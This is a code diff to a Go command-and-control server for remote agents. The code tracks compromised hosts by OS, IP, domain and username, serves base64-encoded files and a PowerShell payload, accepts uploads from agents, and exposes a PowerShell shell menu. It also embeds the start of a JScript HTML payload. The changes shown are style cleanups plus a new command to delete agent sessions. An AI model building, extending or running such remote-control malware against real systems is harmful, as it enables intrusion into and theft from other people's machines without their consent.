@@ -14,7 +14,7 @@ import (
 	"strings"
 	"time"
 
-	"github.com/AlecAivazis/survey/v2"
+	"github.com/AlecAivazis/survey"
 	"github.com/fatih/color"
 	"github.com/olekukonko/tablewriter"
 
@@ -41,12 +41,12 @@ const help = `
 
 var (
 	OS, Arch, IP, hostname, domain, username string //  func info_os()  表格变量
-	cmd                                      string = ""
+	cmd                                      = ""
 	AGENTS                                   map[string]string
-	session_id                               string = ""
-	Host                                     string = ""
-	back                                     string = ""
-	code                                     string = `
+	session_id                               = ""
+	Host                                     = ""
+	back                                     = ""
+	code                                     = `
 <html>
 <head>
 <script language="JScript">
@@ -215,7 +215,7 @@ func httpserver(w http.ResponseWriter, r *http.Request) {
 			return
 		} else {
 			encodeString := base64.StdEncoding.EncodeToString(file_data)
-			fmt.Fprintf(w, (encodeString))
+			fmt.Fprintf(w, encodeString)
 		}
 
 		//img上传文件到服务端   img=> upload file to server
@@ -227,7 +227,7 @@ func httpserver(w http.ResponseWriter, r *http.Request) {
 		file, _ := os.Create("./upload/" + GetRandomString(5))
 		file.Write(decoded)
 		file.Close()
-		fmt.Fprintf(w, ("ok upload"))
+		fmt.Fprintf(w, "ok upload")
 
 	} else if url_get.MatchString(r.URL.Path) {
 		//get payload get.PS1
@@ -291,7 +291,7 @@ func info_os() {
 		username = info[5]
 		//定义 info 信息中的变量 Define variables in info
 		data := [][]string{
-			[]string{k, OS, IP, Arch, hostname, domain, username},
+			{k, OS, IP, Arch, hostname, domain, username},
 		}
 		//将info信息做成表格  Information Form
 		table := tablewriter.NewWriter(os.Stdout)
@@ -425,8 +425,21 @@ func completer(in prompt.Document) []prompt.Suggest { //一级菜单栏列表 Fi
 		{Text: "Interact", Description: "Interact with AGENT"},
 		{Text: "shell", Description: "shell => powershell.exe"},
 		{Text: "exit", Description: "Exit the program"},
+		{Text: "del", Description: "del session id"},
 	}
 	return prompt.FilterHasPrefix(s, in.GetWordBeforeCursor(), true)
+}
+
+func del_session(id string)  {
+	Blue := color.New(color.FgBlue).SprintFunc()
+	Red := color.New(color.FgRed).SprintFunc()
+	session_id = strings.Split(id, " ")[1]
+	if len(strings.Split(id, " ")) > 1 {
+		delete(AGENTS, session_id)
+		fmt.Printf("%s del Session id=> %s.\n", Blue("[*]"), session_id)
+	} else {
+		fmt.Printf("%s could not find it id  %s \n", Red("[*]"),session_id)
+	}
 }
 
 func Session_id(id string) {
@@ -463,6 +476,8 @@ func Options() { //定义tab 下拉菜单选项参数
 			fmt.Println(help)
 		} else if strings.Contains(options, "Interact") {
 			Session_id(options)
+		}else if  strings.Contains(options, "del"){
+			del_session(options)
 		} else if options == "session list" {
 			info_os()
 		} else if options == "exit" {
